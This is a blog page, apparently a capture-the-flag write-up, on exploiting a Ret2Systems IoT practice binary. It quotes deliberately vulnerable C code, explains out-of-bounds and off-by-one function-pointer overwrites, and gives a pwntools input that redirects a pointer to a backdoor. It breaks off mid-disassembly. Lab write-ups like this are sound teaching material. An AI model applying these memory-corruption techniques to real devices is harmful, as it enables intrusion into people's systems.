@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=59363&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>IOT Secure CTF [Ret2Systems] - My New Hugo Site</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Even as modern desktops and servers gain more mitigations and protections, somehow Internet Of Things devices lag way behind. Yet people have started introducing countless &#34;smart&#34; devices into their home and onto their network. It is time to hack into these toasters, refrigerators, thermostats, and lightbulbs." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:59363/posts/ret2-aslr/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="IOT Secure CTF [Ret2Systems]">
+  <meta property="og:description" content="Even as modern desktops and servers gain more mitigations and protections, somehow Internet Of Things devices lag way behind. Yet people have started introducing countless &#34;smart&#34; devices into their home and onto their network. It is time to hack into these toasters, refrigerators, thermostats, and lightbulbs.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-15T15:27:13+10:00">
+    <meta property="article:modified_time" content="2025-06-15T15:27:13+10:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="IOT Secure CTF [Ret2Systems]">
+  <meta name="twitter:description" content="Even as modern desktops and servers gain more mitigations and protections, somehow Internet Of Things devices lag way behind. Yet people have started introducing countless &#34;smart&#34; devices into their home and onto their network. It is time to hack into these toasters, refrigerators, thermostats, and lightbulbs.">
+
+        <link href="http://localhost:59363/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:59363/css/main.6a0f23ea50fd34b46fee262a5a68e17d458c51a2bc99ba1ba018065de6b180c3.css" />
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:59363/">My New Hugo Site</a>
+	</div>
+	<nav>
+		
+		
+	</nav>
+</header>
+
+<main>
+  <article>
+    <div class="post-container">
+      
+      <div class="post-content">
+        <div class="title">
+          <h1 class="title">IOT Secure CTF [Ret2Systems]</h1>
+          <div class="meta">Posted on Jun 15, 2025</div>
+        </div>
+        
+        <section class="body">
+          <h2 id="problem-description">Problem Description</h2>
+<p>Even as modern desktops and servers gain more mitigations and protections, somehow Internet Of Things devices lag way behind.</p>
+<p>Yet people have started introducing countless &ldquo;smart&rdquo; devices into their home and onto their network.</p>
+<p>It is time to hack into these toasters, refrigerators, thermostats, and lightbulbs.</p>
+<h2 id="initial-analysis-of-the-challenge">Initial Analysis of the Challenge</h2>
+<p>I noticed some interesting function names when the file was loaded into Binary Ninja that I thought I may end up using later.</p>
+<ol>
+<li>fridgeBackdoorAuth</li>
+<li>fridgeBackdoorManager</li>
+<li>disable_system</li>
+<li>initAlarm</li>
+<li>printAlarmPassword</li>
+<li>manageAlarm</li>
+<li>fridgeBackdoor</li>
+</ol>
+<p>To bypass the permissions and capture the flag, these are the restrictions I am working with.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/bin/p1_iot&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:      x86_64
+</span></span><span style="display:flex;"><span>    RELRO:     Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:     Stack Cookie Detected
+</span></span><span style="display:flex;"><span>    NX:        NX Enabled
+</span></span><span style="display:flex;"><span>    ASLR:      Enabled
+</span></span><span style="display:flex;"><span>    PIE:       Enabled
+</span></span></code></pre></div><h2 id="analysis-of-the-source-code">Analysis of the Source Code</h2>
+<p>Following an initial, thorough review of the code, I recorded several potential issues that required attention. Lets go through these potential issues.</p>
+<ul>
+<li><strong>Potential Issue 1:</strong>
+This snippet of code could be used for aslr since password is pointing directly to exit.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">initAlarm</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> exit;
+</span></span><span style="display:flex;"><span>    armed <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><strong>Potential Issue 2:</strong>
+Printing password directly to the screen can reveal the memory address (ASLR Potential). Interesting way to print things: Printing password in %08lx format, %08lx = pad with zeros not spaces, 8 -&gt; minimum characters of width, l -&gt; password is expected to be a long or unsigned long, x -&gt; print in hexadecimal (lowercase).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printAlarmPassword</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ISSUE: 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;.--------------------.&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;| Current Password:  |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;|    %08lx    |</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, password); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;&#39;--------------------&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><strong>Potential Issue 3:</strong>
+The “resp” variable does not look for where parsing stops. I don&rsquo;t encounter code that looks like this often so I made note of it.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">manageAlarm</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;ENTER ALARM PASSWORD TO CONTINUE:&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">32</span>, stdin);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> resp <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    .............
+</span></span><span style="display:flex;"><span>    (rest of the code)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><strong>Potential Issue 4:</strong>
+I was reading the lightBulb structure and noticed <code>favNum</code> has a maximum length of 10. But there was a logic error in the code that is allowing values greater than 10, you can access values outside of the array. The logic error is at <code>if (favNum &gt;= 0x10)</code>. The decimal of 0x10 is 16 allowing us to bypass the input restriction. At line <code>lightBulb.current_color = lightBulb.favorite_colors[favNum];</code> we may be able to modify variables outside the stated range.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> lightBulb
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> favorite_colors[<span style="color:#ae81ff">10</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>toggle)();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> current_color;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> on;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> toast_count;
+</span></span><span style="display:flex;"><span>} lightBulb;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setLightbulb</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;.-----------------------------------.&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;| Colormatic |  Home  | [Settings]  |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;| --------------------------------- |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;| Menu:                             |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;|  [1] Set Directly                 |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;|  [2] Use Favorite                 |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;&#39;-----------------------------------&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Enter Choice:&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> resp <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_uint</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (resp <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter color as hex:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        lightBulb.current_color <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_hex32</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (resp <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter favorite number:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> favNum <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_uint</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (favNum <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;Number out range</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>        lightBulb.current_color <span style="color:#f92672">=</span> lightBulb.favorite_colors[favNum];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><strong>Potential Issue 5:</strong>
+Using logic error presented in the previous issue. I noticed we can modify the address of <code>lightbulb.toggle</code>. We can set <code>color</code> to an address of our choice and use the line <code>lightBulb.favorite_colors[favNum] = color;</code> to modify the address <code>lightbulb.toggle</code> calls.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setLightbulbFavorite</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter favorite number:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> favNum <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_uint</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (favNum <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;Number out range</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter color as hex:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> color <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_hex32</span>();
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>    lightBulb.favorite_colors[favNum] <span style="color:#f92672">=</span> color;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%06x saved to favorite #%u:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, color, favNum);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><strong>Potential Issue 6:</strong></li>
+</ul>
+<p>The <code>fireAlarm</code> only allows 8 characters as input. In the <code>manageFireAlarm</code> I noticed a possibility of a logic bug, the loop breaks when index is 8 allowing for an extra character or two into the “alarm” function allowing us to modify the memory address of the <code>fireAlarm.alarm</code> and setting a memory address of our choice.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> fireAlarm
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> phone_number[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>alarm)();
+</span></span><span style="display:flex;"><span>} fireAlarm;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">manageFireAlarm</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;   _____________  &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;  /             </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34; /       &#34;&#34;O&#34;&#34;       </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;|                 |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;|  Staysafe(tm).  |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;|    [ &#34;&#34;TEST&#34;&#34; ]     |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;|                 |&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">               /&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_____________/&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Press TEST? [Y/n]&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">4</span>, stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">||</span> buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;N&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Enter phone number to test:&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">20</span>, stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>(buf); i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (buf[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">||</span> buf[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        fireAlarm.phone_number[index] <span style="color:#f92672">=</span> buf[i];
+</span></span><span style="display:flex;"><span>        index<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (index <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;BEEP BEEP BEEP BEEP BEEP BEEP...&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Calling %.8s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fireAlarm.phone_number);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;RING...&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;No answer....&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><strong>Potential Issue 7:</strong>
+When the toaster would make toast it would increment by 91˚F, after that it would check for smoke.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setToasterTemperature</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Enter temperature:&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> goal <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_uint</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (goal <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">370</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Unsafe temperature!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    toaster.goal_temperature <span style="color:#f92672">=</span> goal;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Temperature set to %u&#39;F</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, toaster.goal_temperature);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">makeToast</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (toaster.didToast)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;This toast has already been made!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Starting toast...&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printToaster</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, toaster.temperature);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (toaster.temperature <span style="color:#f92672">&lt;</span> toaster.goal_temperature)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;...&#34;</span>);
+</span></span><span style="display:flex;"><span>        toaster.temperature <span style="color:#f92672">+=</span> <span style="color:#ae81ff">91</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printToaster</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, toaster.temperature);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">checkForSmoke</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;DING!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printToaster</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, toaster.temperature);
+</span></span><span style="display:flex;"><span>    toaster.didToast <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
+<p>When I first ran the program I noticed there was an error that stated &ldquo;Warning fridge circuit overloaded,
+Some devices may refuse to turn on&rdquo;. We will start by turning the fridge circuit off so we can interact with the other devices.</p>
+<p>Lets begin the exploitation phase, I began by targetting the &ldquo;Issue 6&rdquo; (Fire Alarm) as discussed in our source code analysis.</p>
+<p>When prompted to enter a phone number to call, I sent in two extra bytes to modify the <code>fire.alarm</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">&#39;Enter phone number to test:&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1234567</span><span style="color:#ae81ff">\x18\x05</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><p>I pointed it to the <code>fridgeBackdoor</code> since I noticed it allowed me to access the <code>fridgeBackdoorAuth</code>.</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">Function fridgeBackdoor
+1805:  push    rbp
+1806:  mov     rbp, rsp
+1809:  lea     rdi, [rel aConnectingtoback]  &#34;Connecting to backdoor.....&#34;
+1810:  call    puts
+1815:  mov     eax, 0x0
+181a:  call    fridgeBackdoorAuth
+181f:  nop     
+1820:  pop     rbp
+1821:  retn    
+</code></pre><p>In order to execute <code>file.alarm</code> I used the <code>checkForSmoke</code> function that can trigger a fire alarm if the temperature gets too high. I increased the temperature on the toaster to 370 degrees so the toast burns and starts to smoke.</p>
+<p>This allows for the <code>checkForSmoke</code> function to execute the the line <code>fireAlarm.alarm()</code>. Instead of executing the function to call the fire brigade, it runs the memory address we provided earlier to overwrite the value of <code>fire.alarm</code> when entering in the phone number.</p>
+<p>After gaining access to the <code>fridgeBackdoor</code>, I was met with a prompt for a password. This is where more reverse engineering was required. After carefully analysing the assembly code below, I found that the desired value required was <code> 0x2d64a</code>.</p>
+<p>Furthermore, I found that the highest value I could enter was 0x79. The <code>movsx rax, al</code> interprets the byte as a signed int8 and extends the sign to 64 bits. So any byte ≥ 0x80 is treated as a negative number.</p>
+<p>The algorithm in itself was fairly basic, it added my a byte to the <code>rbp-0x48</code> register and then left shifted it by 1.</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">0xff8:  push    rbp
+0xff9:  mov     rbp, rsp
+0xffc:  push    rbx
+0xffd:  sub     rsp, 0x48
+0x1001:  mov     rax, qword [fs:0x28]
+0x100a:  mov     qword [rbp-0x18], rax
+0x100e:  xor     eax, eax
+0x1010:  mov     qword [rbp-0x40], 0x0
+0x1018:  mov     qword [rbp-0x38], 0x0
+0x1020:  mov     qword [rbp-0x30], 0x0
+0x1028:  mov     qword [rbp-0x28], 0x0
+0x1030:  lea     rdi, [rel data_2568]  &#34;[31;1mPASSWORD REQUIRED TO CON…&#34;
+0x1037:  call    puts
+0x103c:  mov     rdx, qword [rel stdin]
+0x1043:  lea     rax, [rbp-0x40]
+0x1047:  mov     esi, 0x20
+0x104c:  mov     rdi, rax
+0x104f:  call    fgets
+0x1054:  mov     qword [rbp-0x48], 0x0
+0x105c:  mov     dword [rbp-0x4c], 0x0
+0x1063:  jmp     0x108d
+0x1065:  mov     eax, dword [rbp-0x4c]
+0x1068:  cdqe    
+0x106a:  movzx   eax, byte [rbp+rax-0x40]
+0x106f:  cmp     al, 0xa
+0x1071:  je      0x10a6
+0x1073:  mov     eax, dword [rbp-0x4c]
+0x1076:  cdqe    
+0x1078:  movzx   eax, byte [rbp+rax-0x40]
+0x107d:  movsx   rax, al
+0x1081:  add     qword [rbp-0x48], rax
